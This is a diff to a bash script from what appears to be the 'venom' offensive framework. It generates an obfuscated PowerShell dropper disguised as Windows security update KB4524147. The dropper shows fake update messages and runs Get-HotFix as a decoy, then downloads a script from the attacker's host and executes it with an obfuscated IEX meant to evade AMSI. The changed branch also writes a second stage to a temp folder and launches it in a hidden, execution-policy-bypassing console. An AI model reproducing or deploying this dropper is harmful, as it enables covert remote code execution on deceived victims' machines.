@@ -12028,7 +12028,7 @@ if [ -z "$NaM" ]; then NaM="Security-Update";fi
 if [ -z "$Drop" ]; then Drop="Update-KB4524147";fi
 
 
-# display final settings to user
+## Display final settings to user
 echo "${BlueF}[${YellowF}i${BlueF}]${white} AMSI MODULE SETTINGS"${Reset};
 echo ${BlueF}"---"
 cat << !
@@ -12045,43 +12045,43 @@ echo "---"
 ## BUILD DROPPER (with Get-HotFix decoy command)
 # echo "\$proxy=new-object -com WinHttp.WinHttpRequest.5.1;\$proxy.open('GET','http://$lhost/$NaM.ps1',\$false);\$proxy.send();iex \$proxy.responseText" > $IPATH/output/$Drop.ps1
 echo "${BlueF}[☠]${white} Building Obfuscated ps1 dropper ..${white}";sleep 2
-echo "<#" > $IPATH/output/$Drop.ps1
-echo "Obfuscated Powershell Dropper" >> $IPATH/output/$Drop.ps1
-echo "Framework: venom v1.0.16 (amsi evasion)" >> $IPATH/output/$Drop.ps1
-echo "Author: @r00t-3xp10it" >> $IPATH/output/$Drop.ps1
-echo "#>" >> $IPATH/output/$Drop.ps1
-echo "" >> $IPATH/output/$Drop.ps1
-echo "\$host.UI.RawUI.WindowTitle = \"Cumulative Security Update KB4524147\";" >> $IPATH/output/$Drop.ps1
-echo "write-Host \"Please Be Patience While We Search For Available Updates to \$env:computername System ..\" -ForegroundColor gray -BackgroundColor Black;" >> $IPATH/output/$Drop.ps1
-echo "   Get-HotFix;\$proxy=new-object -com WinHttp.WinHttpRequest.5.1;" >> $IPATH/output/$Drop.ps1
-echo "        \$proxy.open('GET','http://$lhost/$NaM.ps1',\$false);" >> $IPATH/output/$Drop.ps1
-echo "        \$proxy.send();" >> $IPATH/output/$Drop.ps1
-## Obfuscated IEX (Invoke-Expression) API call (in PS console)
-echo "& ('ie'+'x') \$proxy.responseText" >> $IPATH/output/$Drop.ps1
+## Read settings from venom-main settings file
+ovni=$(cat $IPATH/settings|grep -m 1 'OBFUSCATION'|cut -d '=' -f2)
 
-
-## Attempting to hidde powershell execution terminal
-# DESCRIPTION: dropper.ps1 will write in $env:tmp folder the dropper/exec (KB4524147_4nF7.ps1)
-# and then execute it in a powershell hidden console <-- need to know if this works (BETA) ..
-# HOW TO: 1º - Comment (#) the above dropper build (line 12047 to 12060)
-# 2º - Un-Comment (#) this follow dropper build (line 12069 to 12083)
-# ---
-#echo "<#" > $IPATH/output/$Drop.ps1
-#echo "Obfuscated Powershell Dropper" >> $IPATH/output/$Drop.ps1
-#echo "Framework: venom v1.0.16 (amsi evasion)" >> $IPATH/output/$Drop.ps1
-#echo "Author: @r00t-3xp10it" >> $IPATH/output/$Drop.ps1
-#echo "#>" >> $IPATH/output/$Drop.ps1
-#echo "" >> $IPATH/output/$Drop.ps1
-#echo "\$host.UI.RawUI.WindowTitle = \"Cumulative Security Update KB4524147\";" >> $IPATH/output/$Drop.ps1
-#echo "write-host \"Please Be Patience While We Search For Available Updates to \$env:userdomain System\";" >> $IPATH/output/$Drop.ps1
-#echo "Get-HotFix -Description 'Security Update';" >> $IPATH/output/$Drop.ps1
-#echo "echo \"\`\$host.UI.RawUI.WindowTitle = \`\"Cumulative Security Update KB4524147\`\";\" > \$env:$rpath\\KB4524147_4nF7.ps1" >> $IPATH/output/$Drop.ps1
-#echo "echo \"   \`\$proxy=new-object -com WinHttp.WinHttpRequest.5.1;\" >> \$env:$rpath\\KB4524147_4nF7.ps1" >> $IPATH/output/$Drop.ps1
-#echo "echo \"        \`\$proxy.open('GET','http://$lhost/$NaM.ps1',\`\$false);\" >> \$env:$rpath\\KB4524147_4nF7.ps1" >> $IPATH/output/$Drop.ps1
-#echo "echo \"        \`\$proxy.send();\" >> \$env:$rpath\\KB4524147_4nF7.ps1" >> $IPATH/output/$Drop.ps1
-#echo "echo \"& ('ie'+'x') \`\$proxy.responseText;\" >> \$env:$rpath\\KB4524147_4nF7.ps1" >> $IPATH/output/$Drop.ps1
-#echo "Start-Sleep -seconds 1;PoWeRsHeLl -Execution Bypass -WindowStyle Hidden -NoProfile -File \"\$env:$rpath\\KB4524147_4nF7.ps1\"" >> $IPATH/output/$Drop.ps1
-## --- END - Attempting to hidde powershell execution terminal
+if [ "$ovni" = "OFF" ]; then
+   echo "<#" > $IPATH/output/$Drop.ps1
+   echo "Obfuscated Powershell Dropper" >> $IPATH/output/$Drop.ps1
+   echo "Framework: venom v1.0.16 (amsi evasion)" >> $IPATH/output/$Drop.ps1
+   echo "Author: @r00t-3xp10it" >> $IPATH/output/$Drop.ps1
+   echo "#>" >> $IPATH/output/$Drop.ps1
+   echo "" >> $IPATH/output/$Drop.ps1
+   echo "\$host.UI.RawUI.WindowTitle = \"Cumulative Security Update KB4524147\";" >> $IPATH/output/$Drop.ps1
+   echo "write-Host \"Please Be Patience While We Search For Available Updates to \$env:computername System ..\" -ForegroundColor gray -BackgroundColor Black;" >> $IPATH/output/$Drop.ps1
+   echo "   Get-HotFix;\$proxy=new-object -com WinHttp.WinHttpRequest.5.1;" >> $IPATH/output/$Drop.ps1
+   echo "        \$proxy.open('GET','http://$lhost/$NaM.ps1',\$false);" >> $IPATH/output/$Drop.ps1
+   echo "        \$proxy.send();" >> $IPATH/output/$Drop.ps1
+   ## Obfuscated IEX (Invoke-Expression) API call (in PS console)
+   echo "& ('ie'+'x') \$proxy.responseText" >> $IPATH/output/$Drop.ps1
+else
+   ## Attempting to hidde powershell execution terminal
+   # DESCRIPTION: dropper.ps1 will write in $env:tmp folder the dropper/exec (KB4524147_4nF7.ps1)
+   # and then execute it in a powershell hidden console <-- need to know if this works (BETA) ..
+   echo "<#" > $IPATH/output/$Drop.ps1
+   echo "Obfuscated Powershell Dropper" >> $IPATH/output/$Drop.ps1
+   echo "Framework: venom v1.0.16 (amsi evasion)" >> $IPATH/output/$Drop.ps1
+   echo "Author: @r00t-3xp10it" >> $IPATH/output/$Drop.ps1
+   echo "#>" >> $IPATH/output/$Drop.ps1
+   echo "" >> $IPATH/output/$Drop.ps1
+   echo "\$host.UI.RawUI.WindowTitle = \"Cumulative Security Update KB4524147\";" >> $IPATH/output/$Drop.ps1
+   echo "write-host \"Please Be Patience While We Search For Available Updates to \$env:userdomain System\";" >> $IPATH/output/$Drop.ps1
+   echo "Get-HotFix -Description 'Security Update';" >> $IPATH/output/$Drop.ps1
+   echo "echo \"\`\$host.UI.RawUI.WindowTitle = \`\"Cumulative Security Update KB4524147\`\";\" > \$env:$rpath\\KB4524147_4nF7.ps1" >> $IPATH/output/$Drop.ps1
+   echo "echo \"   \`\$proxy=new-object -com WinHttp.WinHttpRequest.5.1;\" >> \$env:$rpath\\KB4524147_4nF7.ps1" >> $IPATH/output/$Drop.ps1
+   echo "echo \"        \`\$proxy.open('GET','http://$lhost/$NaM.ps1',\`\$false);\" >> \$env:$rpath\\KB4524147_4nF7.ps1" >> $IPATH/output/$Drop.ps1
+   echo "echo \"        \`\$proxy.send();\" >> \$env:$rpath\\KB4524147_4nF7.ps1" >> $IPATH/output/$Drop.ps1
+   echo "echo \"& ('ie'+'x') \`\$proxy.responseText;\" >> \$env:$rpath\\KB4524147_4nF7.ps1" >> $IPATH/output/$Drop.ps1
+   echo "Start-Sleep -seconds 1;PoWeRsHeLl -Execution Bypass -WindowStyle Hidden -NoProfile -File \"\$env:$rpath\\KB4524147_4nF7.ps1\"" >> $IPATH/output/$Drop.ps1 
+fi
 
 
 ## Build Reverse Powershell Shell
